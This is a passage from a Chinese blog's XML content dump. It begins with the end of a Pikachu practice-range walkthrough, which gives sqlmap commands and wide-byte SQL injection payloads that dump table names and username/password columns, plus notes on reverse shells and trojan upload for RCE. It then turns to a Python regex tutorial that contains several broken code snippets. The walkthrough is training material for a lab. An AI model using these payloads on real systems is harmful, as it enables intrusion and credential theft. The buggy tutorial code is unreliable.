class="line">//（布尔盲注通过页面返回的True或False来判断）</span><br><span class="line">//sqlmapPayload:</span><br><span class="line">sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_b.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; –dbs</span><br><span class="line">//余下步骤与第二题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="9-基于时间的盲注"><a href="#9-基于时间的盲注" class="headerlink" title="9.基于时间的盲注"></a>9.基于时间的盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//(时间盲注通过页面回应时间来判断)</span><br><span class="line">//sqlmapPayload:</span><br><span class="line">sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_t.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs  </span><br><span class="line">//余下步骤与第二题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="10-wide-byte注入"><a href="#10-wide-byte注入" class="headerlink" title="10.wide byte注入"></a>10.wide byte注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//在bp中手注</span><br><span class="line">///Payload: </span><br><span class="line">name=kobe%df’ union select 1,database() # //查库</span><br><span class="line">name=1%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2# //查表</span><br><span class="line">name=1%df’ union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2# //查字段名</span><br><span class="line">name=1%df’ union select (select group_concat(username,0x3b,password) from test.users),2#//查字段内容</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="1-exec-“ping”"><a href="#1-exec-“ping”" class="headerlink" title="1. exec “ping”"></a><strong>1. exec “ping”</strong></h3><p>输入框相当与linux终端</p><p>可以利用反shell控制（需要内网穿透）、上传木马</p><p><img src="/../images/pikachu.assets/22.png"></p><p><img src="/../images/pikachu.assets/23.png"></p><h3 id="2-exec-“eval”"><a href="#2-exec-“eval”" class="headerlink" title="2.exec “eval”"></a><strong>2.exec “eval”</strong></h3><p>输入框将用户输入的字符串当做php脚本了解析执行</p><p>可以利用system()函数反shell连接（需要内网穿透）或者上传木马通过中国蚁剑连接</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2023/12/27/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2023/12/27/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则</title>
      <link href="/2023/12/26/%E6%AD%A3%E5%88%99/"/>
      <url>/2023/12/26/%E6%AD%A3%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正则基础"><a href="#一、正则基础" class="headerlink" title="一、正则基础"></a>一、正则基础</h2><h3 id="1、为什么使用正则"><a href="#1、为什么使用正则" class="headerlink" title="1、为什么使用正则"></a>1、为什么使用正则</h3><ul><li><p>需求</p><p>判断一个字符串是否是手机号</p></li><li><p>解决</p><p>编写一个函数，给函数一个字符串，如果是手机号则返回True，否则返回False</p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isPhone</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="comment"># 长度为11</span></span><br><span class="line">    <span class="comment"># 全部都是数字字符</span></span><br><span class="line">    <span class="comment"># 以1开头</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isPhone(<span class="string">&quot;13812345678&quot;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;是手机号&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不是手机号&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>注意</p><p>如果使用正则会让这个问题变得简单</p></li></ul><h3 id="2、正则与re模块简介"><a href="#2、正则与re模块简介" class="headerlink" title="2、正则与re模块简介"></a>2、正则与re模块简介</h3><p><strong>概述：</strong> <strong>正则表达式</strong>，又称规则表达式</p><p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern）</p><p>正则匹配是一个 模糊的匹配(不是精确匹配)</p><p><strong>re：</strong>python自1.5版本开始增加了re模块，该模块提供了perl风格的正则表达式模式，re模块是python语言拥有了所有正则表达式的功能</p><ul><li>如下四个方法经常使用<ul><li>match()</li><li>search()</li><li>findall()</li><li>finditer()</li></ul></li></ul><h2 id="二、正则表达式"><a href="#二、正则表达式" class="headerlink" title="二、正则表达式"></a>二、正则表达式</h2><h3 id="1、匹配单个字符与数字"><a href="#1、匹配单个字符与数字" class="headerlink" title="1、匹配单个字符与数字"></a>1、匹配单个字符与数字</h3><table><thead><tr><th>匹配</th><th>说明</th></tr></thead><tbody><tr><td>.</td><td>匹配除换行符以外的任意字符，当flags被设置为re.S时，可以匹配包含换行符以内的所有字符</td></tr><tr><td>[]</td><td>里面是字符集合，匹配[]里任意一个字符</td></tr><tr><td>[0123456789]</td><td>匹配任意一个数字字符</td></tr><tr><td>[0-9]</td><td>匹配任意一个数字字符</td></tr><tr><td>[a-z]</td><td>匹配任意一个小写英文字母字符</td></tr><tr><td>[A-Z]</td><td>匹配任意一个大写英文字母字符</td></tr><tr><td>[A-Za-z]</td><td>匹配任意一个英文字母字符</td></tr><tr><td>[A-Za-z0-9]</td><td>匹配任意一个数字或英文字母字符</td></tr><tr><td>[^lucky]</td><td>[]里的^称为脱字符，表示非，匹配不在[]内的任意一个字符</td></tr><tr><td>^[lucky]</td><td>以[]中内的某一个字符作为开头</td></tr><tr><td>\d</td><td>匹配任意一个数字字符，相当于[0-9]</td></tr><tr><td>\D</td><td>匹配任意一个非数字字符，相当于<code>[^0-9]</code></td></tr><tr><td>\w</td><td>匹配字母、下划线、数字中的任意一个字符，相当于[0-9A-Za-z_]</td></tr><tr><td>\W</td><td>匹配非字母、下划线、数字中的任意一个字符，相当于<code>[^0-9A-Za-z_]</code></td></tr><tr><td>\s</td><td>匹配空白符(空格、换页、换行、回车、制表)，相当于[ \f\n\r\t]</td></tr><tr><td>\S</td><td>匹配非空白符(空格、换页、换行、回车、制表)，相当于<code>[^ \f\n\r\t]</code></td></tr></tbody></table><h3 id="2、匹配锚字符"><a href="#2、匹配锚字符" class="headerlink" title="2、匹配锚字符"></a>2、匹配锚字符</h3><p>锚字符:用来判定是否按照规定开始或者结尾</p><table><thead><tr><th>匹配</th><th>说明</th></tr></thead><tbody><tr><td>^</td><td>行首匹配，和[]里的^不是一个意思</td></tr><tr><td>$</td><td>行尾匹配</td></tr></tbody></table><h3 id="3、限定符"><a href="#3、限定符" class="headerlink" title="3、限定符"></a>3、限定符</h3><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。</p><table><thead><tr><th>匹配</th><th>说明</th></tr></thead><tbody><tr><td>(xyz)</td><td>匹配括号内的xyz，作为一个整体去匹配  一个单元 子存储</td></tr><tr><td>x?</td><td>匹配0个或者1个x，非贪婪匹配</td></tr><tr><td>x*</td><td>匹配0个或任意多个x</td></tr><tr><td>x+</td><td>匹配至少一个x</td></tr><tr><td>x{n}</td><td>确定匹配n个x，n是非负数</td></tr><tr><td>x{n,}</td><td>至少匹配n个x</td></tr><tr><td>x{n,m}</td><td>匹配至少n个最多m个x</td></tr><tr><td>x|y</td><td>|表示或的意思，匹配x或y</td></tr></tbody></table><h2 id="三、re模块中常用函数"><a href="#三、re模块中常用函数" class="headerlink" title="三、re模块中常用函数"></a>三、re模块中常用函数</h2><p><strong>通用flags（修正符）</strong></p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>re.I</td><td>是匹配对大小写不敏感</td></tr><tr><td>re.S</td><td>使.匹配包括换行符在内的所有字符</td></tr></tbody></table><p><strong>通用函数</strong></p><ul><li><p>获取匹配结果</p><ul><li><p>使用group()方法 获取到匹配的值</p></li><li><p>groups()    返回一个包含所有小组字符串的元组(也就是自存储的值)，从 1 到 所含的小组号。</p></li></ul></li></ul><h3 id="1、match-函数"><a href="#1、match-函数" class="headerlink" title="1、match()函数"></a>1、match()函数</h3><ul><li><p>原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def match(pattern, string, flags=0)</span><br></pre></td></tr></table></figure></li><li><p>功能</p><p>匹配成功返回 匹配的对象  </p><p>匹配失败 返回 None</p></li></ul><ul><li><p>获取匹配结果</p><ul><li><p>使用group()方法 获取到匹配的值</p></li><li><p>groups()    返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</p></li></ul></li><li><p>注意：从第一位开始匹配  只匹配一次</p></li></ul><ul><li><p>参数</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式(一种字符串的模式)</td></tr><tr><td>string</td><td>要匹配的字符串</td></tr><tr><td>flags</td><td>标识位，用于控制正则表达式的匹配方式</td></tr></tbody></table></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">res = re.<span class="keyword">match</span>(<span class="string">&#x27;\d&#123;2&#125;&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.group())</span><br><span class="line"></span><br><span class="line"><span class="comment">#给当前匹配到的结果起别名</span></span><br><span class="line">s = <span class="string">&#x27;3G4HFD567&#x27;</span></span><br><span class="line">re.<span class="keyword">match</span>(<span class="string">&quot;(?P&lt;value&gt;\d+)&quot;</span>,s)</span><br><span class="line"><span class="built_in">print</span>(x.group(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(x.group(<span class="string">&#x27;value&#x27;</span>))</span><br></pre></td></tr></table></figure></li></ul><h3 id="2、searce-函数"><a href="#2、searce-函数" class="headerlink" title="2、searce()函数"></a>2、searce()函数</h3><ul><li><p>原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure></li><li><p>功能</p><p>扫描整个字符串string，并返回第一个pattern模式成功的匹配</p><p>匹配失败 返回 None</p></li><li><p>参数</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式(一种字符串的模式)</td></tr><tr><td>string</td><td>要匹配的字符串</td></tr><tr><td>flags</td><td>标识位，用于控制正则表达式的匹配方式</td></tr></tbody></table></li><li><p>注意：</p><p>只要字符串包含就可以</p><p>只匹配一次</p></li><li><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">res = re.search(<span class="string">&#x27;[a-z]&#x27;</span>, <span class="string">&#x27;131A3ab889s&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(res.group()</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>注意</p><p>与search的区别</p><p>相同点：</p><p>都只匹配一次</p><p>不同点：</p><ul><li>search是在要匹配的字符串中  包含正则表达式的内容就可以</li><li>match 必须第一位就开始匹配  否则匹配失败</li></ul></li></ul><h3 id="3、findall-函数（返回列表）"><a href="#3、findall-函数（返回列表）" class="headerlink" title="3、findall()函数（返回列表）"></a>3、findall()函数（返回列表）</h3><ul><li><p>原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def findall(pattern, string, flags=0)</span><br></pre></td></tr></table></figure></li><li><p>功能</p><p>扫描整个字符串string，并返回所有匹配的pattern模式结果的字符串列表</p></li><li><p>参数</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式(一种字符串的模式)</td></tr><tr><td>string</td><td>要匹配的字符串</td></tr><tr><td>flags</td><td>标识位，用于控制正则表达式的匹配方式</td></tr></tbody></table></li><li><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">myStr = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;A href=&quot;http://www.taobao.com&quot;&gt;淘宝&lt;/A&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://www.id97.com&quot;&gt;电</span></span><br><span class="line"><span class="string">影网站&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;i&gt;我是倾斜1&lt;/i&gt;</span></span><br><span class="line"><span class="string">&lt;i&gt;我是倾斜2&lt;/i&gt;</span></span><br><span class="line"><span class="string">&lt;em&gt;我是倾斜2&lt;/em&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># html里是不区分大小写</span></span><br><span class="line"><span class="comment"># （1）给正则里面匹配的 加上圆括号 会将括号里面的内容进行 单独的返回</span></span><br><span class="line">res = re.findall(<span class="string">&quot;(&lt;a href=\&quot;http://www\.(.*?)\.com\&quot;&gt;(.*?)&lt;/a&gt;)&quot;</span>,myStr) <span class="comment">#[(&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;, &#x27;baidu&#x27;, &#x27;百度&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 括号的区别</span></span><br><span class="line">res = re.findall(<span class="string">&quot;&lt;a href=\&quot;http://www\..*?\.com\&quot;&gt;.*?&lt;/a&gt;&quot;</span>,myStr) <span class="comment">#[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(2) 不区分大小写的匹配</span></span><br><span class="line">res = re.findall(<span class="string">&quot;&lt;a href=\&quot;http://www\..*?\.com\&quot;&gt;.*?&lt;/a&gt;&quot;</span>,myStr,re.I) <span class="comment">#[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;, &#x27;&lt;A href=&quot;http://www.taobao.com&quot;&gt;淘宝&lt;/A&gt;&#x27;]</span></span><br><span class="line">res = re.findall(<span class="string">&quot;&lt;[aA] href=\&quot;http://www\..*?\.com\&quot;&gt;.*?&lt;/[aA]&gt;&quot;</span>,myStr) <span class="comment">#[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;]</span></span><br><span class="line"><span class="comment"># (3) 使.支持换行匹配</span></span><br><span class="line">res = re.findall(<span class="string">&quot;&lt;a href=&quot;</span>http://www..?.com<span class="string">&quot;&gt;.?&lt;/a&gt;&quot;</span>,myStr,re.S) <span class="comment">#</span></span><br><span class="line"><span class="comment"># (4) 支持换行 支持不区分大小写匹配</span></span><br><span class="line">res = re.findall(<span class="string">&quot;&lt;a href=&quot;</span>http://www..?.com<span class="string">&quot;&gt;.?&lt;/a&gt;&quot;</span>,myStr,re.S|re.I) <span class="comment">#</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></li></ul><h3 id="4、finditer-函数"><a href="#4、finditer-函数" class="headerlink" title="4、finditer()函数"></a>4、finditer()函数</h3><ul><li><p>原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def finditer(pattern, string, flags=0)</span><br></pre></td></tr></table></figure></li><li><p>功能</p><p>与findall()类似，返回一个迭代器</p></li><li><p>参数</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式(一种字符串的模式)</td></tr><tr><td>string</td><td>要匹配的字符串</td></tr><tr><td>flags</td><td>标识位，用于控制正则表达式的匹配方式</td></tr></tbody></table></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">res = re.finditer(<span class="string">&#x27;\w&#x27;</span>, <span class="string">&#x27;12hsakda1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(res))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></li></ul><h3 id="5、split-函数"><a href="#5、split-函数" class="headerlink" title="5、split()函数"></a>5、split()函数</h3><ul><li><p>作用：切割字符串</p></li><li><p>原型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def split(patter, string, maxsplit=0, flags=0)</span><br></pre></td></tr></table></figure></li><li><p>参数</p><p>pattern   正则表达式</p><p>string      要拆分的字符串</p><p>maxsplit   最大拆分次数  默认拆分全部</p><p>flags          修正符</p></li><li><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">myStr = <span class="string">&quot;asdas\rd&amp;a\ts12d\n*a3sd@a_1sd&quot;</span></span><br><span class="line"><span class="comment">#通过特殊字符 对其进行拆分 成列表</span></span><br><span class="line">res = re.split(<span class="string">&quot;[^a-z]&quot;</span>,myStr)</span><br><span class="line">res = re.split(<span class="string">&quot;\W&quot;</span>,myStr)</span><br></pre></td></tr></table></figure></li></ul><h3 id="6、修正符"><a href="#6、修正符" class="headerlink" title="6、修正符"></a>6、修正符</h3><ul><li><p>作用</p><p>对正则进行修正</p></li><li><p>使用</p><p>search&#x2F;match&#x2F;findall&#x2F;finditer 等函数 flags参数的使用</p></li><li><p>修正符</p><p>re.I   不区分大小写匹配</p><p>re.S    使.可以匹配换行符   匹配任意字符</p></li><li><p>使用</p><p>re.I</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;[a-z]&#x27;</span>,<span class="string">&#x27;AaBb&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;[a-z]&#x27;</span>,<span class="string">&#x27;AaBb&#x27;</span>, flags=re.I))</span><br></pre></td></tr></table></figure><p>re.S</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;</span>,<span class="string">&#x27;&lt;b&gt;b标签&lt;/b&gt;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;</span>,<span class="string">&#x27;&lt;b&gt;b标\n签&lt;/b&gt;&#x27;</span>, flags=re.S))</span><br></pre></td></tr></table></figure></li></ul><h2 id="四、正则高级"><a href="#四、正则高级" class="headerlink" title="四、正则高级"></a>四、正则高级</h2><h3 id="1、分组-起名称"><a href="#1、分组-起名称" class="headerlink" title="1、分组&amp;起名称"></a>1、分组&amp;起名称</h3><ul><li><p>概念</p><p>处理简单的判断是否匹配之外，正则表达式还有提取子串的功能，用()表示的就是要提取的分组</p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#给当前匹配到的结果起别名</span></span><br><span class="line">s = <span class="string">&#x27;3G4HFD567&#x27;</span></span><br><span class="line">re.<span class="keyword">match</span>(<span class="string">&quot;(?P&lt;value&gt;\d+)&quot;</span>,s)</span><br><span class="line"><span class="built_in">print</span>(x.group(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(x.group(<span class="string">&#x27;value&#x27;</span>))</span><br></pre></td></tr></table></figure></li><li><p>说明</p><ul><li>正则表达式中定义了组，就可以在Match对象上用group()方法提取出子串来</li><li>group(0)永远是原始字符串，group(1)、group(2)……表示第1、2、……个子串</li></ul></li></ul><h3 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h3><ul><li><p>概念</p><p>当在python中使用正则表达式时，re模块会做两件事，一件是编译正则表达式，如果表达式的字符串本身不合法，会报错。另一件是用编译好的正则表达式提取匹配字符串</p></li><li><p>编译优点</p><p>如果一个正则表达式要使用几千遍，每一次都会编译，出于效率的考虑进行正则表达式的编译，就不需要每次都编译了，节省了编译的时间，从而提升效率</p></li><li><p>compile()函数</p><ul><li><p>原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def compile(pattern, flags=0)</span><br></pre></td></tr></table></figure></li><li><p>作用</p><p>将pattern模式编译成正则对象</p></li><li><p>参数</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式(一种字符串的模式)</td></tr><tr><td>flags</td><td>标识位，用于控制正则表达式的匹配方式</td></tr></tbody></table></li><li><p>flags</p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>re.I</td><td>是匹配对大小写不敏感</td></tr><tr><td>re.S</td><td>使.匹配包括换行符在内的所有字符</td></tr></tbody></table></li><li><p>返回值</p><p>编译好的正则对象</p></li><li><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">re_phone = re.<span class="built_in">compile</span>(<span class="string">r&quot;(0\d&#123;2,3&#125;-\d&#123;7,8&#125;)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(re_phone, <span class="built_in">type</span>(re_phone))</span><br></pre></td></tr></table></figure></li></ul></li><li><p>编译后其他方法的使用</p><p>原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def match(self, string, pos=0, endpos=-1)</span><br><span class="line">def search(self, string, pos=0, endpos=-1)</span><br><span class="line">def findall(self, string, pos=0, endpos=-1)</span><br><span class="line">def finditer(self, string, pos=0, endpos=-1)</span><br></pre></td></tr></table></figure><p>参数</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>string</td><td>待匹配的字符串</td></tr><tr><td>pos</td><td>从string字符串pos下标开始</td></tr><tr><td>endpos</td><td>结束下标</td></tr></tbody></table><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;lucky&#x27;s phone is 010-88888888&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;kaige&#x27;s phone is 010-99999999&quot;</span></span><br><span class="line">ret1 = re_phone.search(s1)</span><br><span class="line"><span class="built_in">print</span>(ret1, ret1.group(<span class="number">1</span>))</span><br><span class="line">ret2 = re_phone.search(s2)</span><br><span class="line"><span class="built_in">print</span>(ret2, ret2.group(<span class="number">1</span>))</span><br></pre></td></tr></table></figure></li></ul><h3 id="3、贪婪与非贪婪"><a href="#3、贪婪与非贪婪" class="headerlink" title="3、贪婪与非贪婪"></a>3、贪婪与非贪婪</h3><ul><li><p>贪婪模式  </p><p>贪婪概念：匹配尽可能多的字符</p><ul><li>.+  匹配换行符以外的字符至少一次</li><li>.*  匹配换行符以外的字符任意次</li></ul><p>实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = re.search(<span class="string">&#x27;&lt;b&gt;.+&lt;/b&gt;&#x27;</span>, <span class="string">&#x27;&lt;b&gt;&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;</span>)</span><br><span class="line">res = re.search(<span class="string">&#x27;&lt;b&gt;.*&lt;/b&gt;&#x27;</span>, <span class="string">&#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>非贪婪模式</p><p>非贪婪概念：尽可能少的匹配称为非贪婪匹配，*?、+?即可</p></li><li><p>.+?  匹配换行符以外的字符至少一次  拒绝贪婪</p><ul><li>.*?   匹配换行符以外的字符任意次      拒绝贪婪</li></ul><p>实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = re.search(<span class="string">&#x27;&lt;b&gt;.+?&lt;/b&gt;&#x27;</span>, <span class="string">&#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;</span>)</span><br><span class="line">res = re.search(<span class="string">&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;</span>, <span class="string">&#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><p>练习：</p><ol><li><p>中信证券</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 将产品名称管理人  风险评级 认购金额 起点公示  信息  全部抓到</span><br></pre></td></tr></table></figure></li><li><p>练习抓取股票  每一行数据</p></li><li><p>豆瓣</p><p>抓取标题和图片img标签</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BS4</title>
      <link href="/2023/12/26/BS4%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/12/26/BS4%E7%AC%94%E8%AE%B0/</url>
      
